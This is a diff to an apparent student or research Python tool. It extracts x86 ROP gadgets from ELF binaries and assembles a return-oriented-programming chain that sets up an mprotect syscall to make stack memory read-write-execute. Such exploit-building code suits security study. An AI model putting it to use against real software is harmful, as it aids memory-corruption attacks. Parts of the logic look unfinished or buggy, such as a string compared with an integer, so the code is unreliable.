@@ -1,4 +1,5 @@
 from capstone import *
+from copy import deepcopy
 from elftools.elf.elffile import ELFFile
 from unicorn import *
 from unicorn.x86_const import *
@@ -39,14 +40,15 @@ class Gadget:
 
 
 class TrieNode:
-    def __init__(self, gadget, parent):
+    def __init__(self, gadget, parent, depth):
         self.gadget = gadget
         self.children = {}
         self.parent = parent
+        self.depth = depth
 
 
-def insert(root, gadget):
-    gadget_node = TrieNode(gadget, root)
+def insert(root, gadget, depth):
+    gadget_node = TrieNode(gadget, root, depth)
 
     # if existing array of gadgets that share mnemonic then append
     if gadget.mnemonic in root.children:
@@ -86,10 +88,10 @@ def populate_trie(root, code, text_section_start_addr):
         # only way to extract single byte as bytestring, indexing just gives integer value
         curr_byte = bytes([code[pos]])
         if curr_byte == b'\xc3':
-            build_from(root, code, pos, text_section_start_addr + pos)
+            build_from(root, code, pos, text_section_start_addr + pos, 0)
 
 
-def build_from(parent_insn, code, pos, parent_instr_addr):
+def build_from(parent_insn, code, pos, parent_instr_addr, depth):
     # max instr len (9) or however many bytes are left in file
     max_len = min(pos + 1, 10)
     for step in range(1, max_len):
@@ -110,14 +112,14 @@ def build_from(parent_insn, code, pos, parent_instr_addr):
             gadget = Gadget(instruction.mnemonic, instruction.op_str,
                             instruction.address, parent_instr_addr, code[start_index: pos])
 
-            gadget_node = insert(parent_insn, gadget)
+            gadget_node = insert(parent_insn, gadget, depth + 1)
             # recurse building gadgets from this node backwards, similar to how building gadgets from ret works
-            build_from(gadget_node, code, start_index, instruction.address)
+            build_from(gadget_node, code, start_index, instruction.address, depth + 1)
 
 
 def test_trie():
     ret_gadget = Gadget('ret', '', -1, -1, b'\xc3')
-    root = TrieNode(ret_gadget, None)
+    root = TrieNode(ret_gadget, None, 0)
 
     # code = b'\x55\x48\x8b\x05\xb8\x13\xc3\x90\x92\x27\xa3'
     # code = b"\x04\x04\x02\x02\xc3"
@@ -131,7 +133,7 @@ def test_trie():
 
 def get_gadgets(binaries):
     ret_gadget = Gadget('ret', '', -1, -1, b'\xc3')
-    root = TrieNode(ret_gadget, None)
+    root = TrieNode(ret_gadget, None, 0)
 
     for binary in binaries:
         print('Processing file: ' + binary)
@@ -152,7 +154,7 @@ def get_gadgets(binaries):
 # ebx = Address of Memory to change (Must align to page boundary)
 # ecx = Length of memory to change
 # edx = 0x07
-registers = {'eax': 0x7B, 'ebx': 0xbffdf000, 'ecx': 0x00021000, 'edx': 0x7}
+registers = {'eax': 0x7d, 'ebx': 0xbffdf000, 'ecx': 0x00021000, 'edx': 0x7}
 EIP_ADDRESS = 0x400000
 STACK_ADDRESS = 0x0
 
@@ -172,92 +174,110 @@ useful_instructions = ['inc (e\S+)', # inc eax
                        'pop (e\S+)', # pop ebx
                        'xchg (e\S+), (e\S+)'] # xchg eax, ebx
 
-def regs_done(curr_state):
-    return registers
+def process_node(node, curr_state, base_addr):
+    gadget_addr = base_addr + node.gadget.start_addr
+    instruction = node.gadget.mnemonic + ' ' + node.gadget.op_str
+
+    temp = b'' 
+    if node.gadget.mnemonic == 'pop':
+        temp += struct.pack("<I", gadget_addr)
+        
+        if node.gadget.op_str in registers:
+            if node.gadget.op_str == 'ebx':
+                val = registers['ebx'] - 1 # Address must be end in 000, so subtract 1 to avoid null byte
+                temp += struct.pack("<I", val)            
+                curr_state['ebx'] = val
+
+            elif node.gadget.op_str == 'ecx':
+                val = registers['ecx'] ^ 0xFFFFFFFF
+                temp += struct.pack("<I", val)
+                curr_state['ecx'] = val 
+
+            else:
+                val = 0x12341234 # Junk for useless pop
+                temp += struct.pack("<I", val)            
+                curr_state[node.gadget.op_str] = val
+
+        else:
+            temp += struct.pack("<I", 0x12341234) # Add random junk for useless pop
+    
+    elif node.gadget.mnemonic == 'xor' and re.search('xor (e\S+), (e\S+)', instruction):
+        reg1, reg2 = re.search('xor (e\S+), (e\S+)', instruction).groups()
+        
+        # Zero out one of eax, ebx, ecx, or edx
+        if reg1 == reg2 and reg1 in registers:
+            temp += struct.pack("<I", gadget_addr)
+            curr_state[reg1] = 0x0
+
+    elif node.gadget.mnemonic == 'inc':
+        # Inc one of eax, ebx, ecx, or edx
+        if node.gadget.op_str in registers:
+            if curr_state[node.gadget.op_str] < registers[node.gadget.op_str]:
+                inc_count = registers[node.gadget.op_str] - curr_state[node.gadget.op_str]
+                temp += struct.pack("<I", gadget_addr) * inc_count 
+                curr_state[node.gadget.op_str] = registers[node.gadget.op_str]
+
+    elif node.gadget.mnemonic == 'not':
+        # Inc one of eax, ebx, ecx, or edx
+        if node.gadget.op_str == 'ecx' and curr_state['ecx'] == registers['ecx'] ^ 0xFFFFFFFF:
+            temp += struct.pack("<I", gadget_addr)
+            curr_state[node.gadget.op_str] = registers[node.gadget.op_str] ^ 0xFFFFFFFF
+
+    elif node.gadget.mnemonic == 'mov' and re.search('mov (e\S+), (0[xX][\dA-Fa-f]+)', instruction):
+        reg, imm = re.search('mov (e\S+), (0[xX][\dA-Fa-f]+)', instruction).groups()
+
+        if reg in registers and imm < curr_state[reg]:
+            temp += struct.pack("<I", gadget_addr)
+            curr_state[reg] = imm      
+
+    return temp       
 
 # Do a BFS on root to find useful gadgets
-def create_payload(root, registers_state, base_addr):
+def create_payload(root, base_addr):
     queue = collections.deque()
     queue.append(root)
 
-    payload = ''
-    temp = '' # In case the remaining gadgets are bad
-    curr_state = {'eax': 0x7B, 'ebx': 0xbffdf000, 'ecx': 0x00021000, 'edx': 0x7} # In case the remaining gadgets are bad
-
-    mu = Uc(UC_ARCH_X86, UC_MODE_32)
-    mu.mem_map(EIP_ADDRESS, 2 * 1024 * 1024)
-    mu.mem_map(STACK_ADDRESS, 1024 * 1024)
-    
-    #mu.reg_write(UC_X86_REG_EBX, 0x0)
-    #mu.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + 1024 * 1024 - 1)
+    payload = b''
+    temp = b''
+    registers_state = {'eax': 0xffffffff, 'ebx': 0xffffffff, 'ecx': 0xffffffff, 'edx': 0xffffffff}
+    curr_state = deepcopy(registers_state) # In case the remaining gadgets are bad
 
     while queue:
         if registers == registers_state:
             return payload
 
         node = queue.popleft()
-
-        gadget_addr = node.gadget.start_addr
-
-        instruction = node.gadget.mnemonic + ' ' + node.gadget.op_str
-
         bad = False
 
-        print(node.gadget.mnemonic)
-        try:
-            # Process node
-            if node.gadget.mnemonic == 'pop':
-                temp += struct.pack("<I", gadget_addr)  
-                print(temp)
-                # Pop one of eax, ebx, ecx, or edx
-                if node.gadget.op_str in registers:
-                    print(temp)
-                    temp += struct.pack("<I", registers[node.gadget.op_str])
-                    curr_state[node.gadget.op_str] = registers[node.gadget.op_str]
-                else:
-                    temp += struct.pack("<I", 0x12341234) # Add random junk for useless pop
-            
-            elif node.gadget.mnemonic == 'xor' and re.search('xor (e\S+), (e\S+)', instruction):
-                reg1, reg2 = re.search('xor (e\S+), (e\S+)', instruction).groups()
-                
-                # Zero out one of eax, ebx, ecx, or edx
-                if reg1 == reg2 and reg1 in registers:
-                    pass
-                else:
-                    pass
-                
-            # Add the current node's children into the queue
-            for mnemonic in node.children:
-                for child in node.children[mnemonic]:
-                    queue.append(child)
-            
-            # Process all of the parent nodes before the lower levels    
-            if node.parent is not None and not bad:
-                queue.appendleft(node.parent)
-                continue
+        instr_payload = process_node(node, curr_state, base_addr)
+        curr_node = node
+        while curr_node.parent != None:
+            if temp != b'' and instr_payload == b'': 
+                if instr_payload == b'':
+                    temp = b''
+                    curr_state = deepcopy(registers_state)
+                    break
             else:
-                # We've reached ret or hit a bad instruction
-                payload += temp
-                registers_state = curr_state
-                temp = ''
-        
-        except UcError as e:
-            # For invalid memory operations
-            temp = ''
-            curr_state = registers_state 
-        
-            #mu.emu_start(EIP_ADDRESS, EIP_ADDRESS + len(node.gadget.code))
+                temp += instr_payload
+                instr_payload = process_node(node, curr_state, base_addr)
+                curr_node = curr_node.parent
+
+        if curr_node.parent == None:
+            payload += temp
+            registers_state = deepcopy(curr_state)
+            temp = b''
 
             
-            #r_ebx = mu.reg_read(UC_X86_REG_EBX)
-            #print(">>> EBX = 0x%x" %r_ebx)
+        # Add the current node's children into the queue
+        for mnemonic in node.children:
+            for child in node.children[mnemonic]:
+                queue.append(child)
         
-        return payload
+    return payload
 
 
 if (len(sys.argv) > 1):
-    registers_state = {'eax': 0x11112222, 'ebx': 0x11112222, 'ecx': 0x11112222, 'edx': 0x11112222}
-    print(create_payload(get_gadgets(sys.argv[1:]), registers_state, 0x0))
+    print(create_payload(get_gadgets(sys.argv[1:]), 0x1111111))
     #root = get_gadgets(sys.argv[1:])
     #print_trie(root, [], 0)
 else:
